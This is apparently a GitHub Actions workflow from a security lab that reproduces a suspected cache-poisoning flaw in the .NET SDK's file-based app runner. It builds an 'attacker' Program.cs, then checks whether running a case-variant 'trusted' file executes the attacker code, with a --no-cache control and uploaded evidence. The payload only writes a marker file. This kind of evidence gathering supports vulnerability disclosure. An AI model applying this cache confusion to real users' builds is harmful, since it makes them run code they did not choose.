name: SDK file-app build-only cache poisoning evidence

on:
  push:
    branches:
      - lab/kestrel-chunk-extensions-20260920
    paths:
      - '.github/workflows/sdk-fileapp-build-only-cache-poison.yml'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  linux-build-only-poison:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 11.0.100-rc.1.26425.128

      - name: Build-only seed then run trusted case variant
        shell: bash
        run: |
          set -euxo pipefail

          ROOT="$RUNNER_TEMP/sdk-fileapp-build-only-poison"
          LOWER_DIR="$ROOT/victim"
          UPPER_DIR="$ROOT/VICTIM"
          LOWER="$LOWER_DIR/Program.cs"
          UPPER="$UPPER_DIR/Program.cs"
          MARKER="$RUNNER_TEMP/SDK_FILEAPP_BUILD_ONLY_ATTACKER.marker"

          rm -rf "$ROOT"
          rm -f "$MARKER"
          mkdir -p "$LOWER_DIR" "$UPPER_DIR"

          cat > "$LOWER" <<EOF
          using System;
          using System.IO;
          File.WriteAllText(@"$MARKER", "ATTACKER");
          Console.WriteLine("BUILD_ONLY_ATTACKER_PAYLOAD_EXECUTED");
          EOF

          cat > "$UPPER" <<'EOF'
          using System;
          Console.WriteLine("BUILD_ONLY_TRUSTED_VICTIM_EXECUTED");
          EOF

          # Both distinct source files exist before the attacker build and have old mtimes.
          touch -d '2020-01-01T00:00:00Z' "$LOWER" "$UPPER"

          python3 - "$LOWER" "$UPPER" <<'PY'
          import hashlib, sys
          for p in sys.argv[1:]:
              print(p, hashlib.sha256(p.upper().encode()).hexdigest())
          print("CASE_NORMALIZED_PATHS_EQUAL=", sys.argv[1].upper() == sys.argv[2].upper())
          PY

          echo "=== Build attacker source WITHOUT executing it ==="
          set +e
          dotnet build "$LOWER" > "$ROOT/build.stdout" 2> "$ROOT/build.stderr"
          BUILD_RC=$?
          set -e
          cat "$ROOT/build.stdout"
          cat "$ROOT/build.stderr"
          echo "BUILD_RC=$BUILD_RC"
          test "$BUILD_RC" -eq 0

          if test -f "$MARKER"; then
            echo 'BUILD_ONLY_PRECONDITION=FAILED_ATTACKER_ALREADY_EXECUTED'
            exit 1
          fi
          echo 'BUILD_ONLY_PRECONDITION=PASS_NO_ATTACKER_EXECUTION'

          echo "=== Cache generated by build-only operation ==="
          find "$HOME/.local/share/dotnet/runfile" -maxdepth 3 -type f -name 'build-success.cache' -print -exec cat {} \; 2>/dev/null || true

          echo "=== Run distinct trusted case-variant file ==="
          rm -f "$MARKER"
          set +e
          dotnet run --file "$UPPER" > "$ROOT/victim.stdout" 2> "$ROOT/victim.stderr"
          VICTIM_RC=$?
          set -e
          cat "$ROOT/victim.stdout"
          cat "$ROOT/victim.stderr"
          echo "VICTIM_RC=$VICTIM_RC"
          test "$VICTIM_RC" -eq 0

          if grep -q 'BUILD_ONLY_ATTACKER_PAYLOAD_EXECUTED' "$ROOT/victim.stdout" && test -f "$MARKER"; then
            echo 'BUILD_ONLY_POISON_RESULT=ATTACKER_EXECUTED_DURING_TRUSTED_RUN'
          elif grep -q 'BUILD_ONLY_TRUSTED_VICTIM_EXECUTED' "$ROOT/victim.stdout"; then
            echo 'BUILD_ONLY_POISON_RESULT=VICTIM_SAFE'
          else
            echo 'BUILD_ONLY_POISON_RESULT=UNKNOWN'
          fi

          echo "=== Hard causal control: trusted run with --no-cache ==="
          rm -f "$MARKER"
          set +e
          dotnet run --file "$UPPER" --no-cache > "$ROOT/nocache.stdout" 2> "$ROOT/nocache.stderr"
          NOCACHE_RC=$?
          set -e
          cat "$ROOT/nocache.stdout"
          cat "$ROOT/nocache.stderr"
          echo "NOCACHE_RC=$NOCACHE_RC"
          test "$NOCACHE_RC" -eq 0

          if grep -q 'BUILD_ONLY_TRUSTED_VICTIM_EXECUTED' "$ROOT/nocache.stdout" && ! test -f "$MARKER"; then
            echo 'BUILD_ONLY_NO_CACHE_CONTROL=TRUSTED_VICTIM_EXECUTED'
          else
            echo 'BUILD_ONLY_NO_CACHE_CONTROL=FAILED'
            exit 1
          fi

          {
            echo "=== BUILD ONLY ==="
            cat "$ROOT/build.stdout" "$ROOT/build.stderr"
            echo "=== VICTIM NORMAL ==="
            cat "$ROOT/victim.stdout" "$ROOT/victim.stderr"
            echo "=== VICTIM NO CACHE ==="
            cat "$ROOT/nocache.stdout" "$ROOT/nocache.stderr"
          } > "$ROOT/summary.txt"

          cp "$ROOT/build.stdout" "$GITHUB_WORKSPACE/sdk-buildonly-build.stdout"
          cp "$ROOT/build.stderr" "$GITHUB_WORKSPACE/sdk-buildonly-build.stderr"
          cp "$ROOT/victim.stdout" "$GITHUB_WORKSPACE/sdk-buildonly-victim.stdout"
          cp "$ROOT/victim.stderr" "$GITHUB_WORKSPACE/sdk-buildonly-victim.stderr"
          cp "$ROOT/nocache.stdout" "$GITHUB_WORKSPACE/sdk-buildonly-nocache.stdout"
          cp "$ROOT/nocache.stderr" "$GITHUB_WORKSPACE/sdk-buildonly-nocache.stderr"
          cp "$ROOT/summary.txt" "$GITHUB_WORKSPACE/sdk-buildonly-summary.txt"

      - name: Upload evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sdk-fileapp-build-only-poison-ubuntu
          path: |
            sdk-buildonly-build.stdout
            sdk-buildonly-build.stderr
            sdk-buildonly-victim.stdout
            sdk-buildonly-victim.stderr
            sdk-buildonly-nocache.stdout
            sdk-buildonly-nocache.stderr
            sdk-buildonly-summary.txt
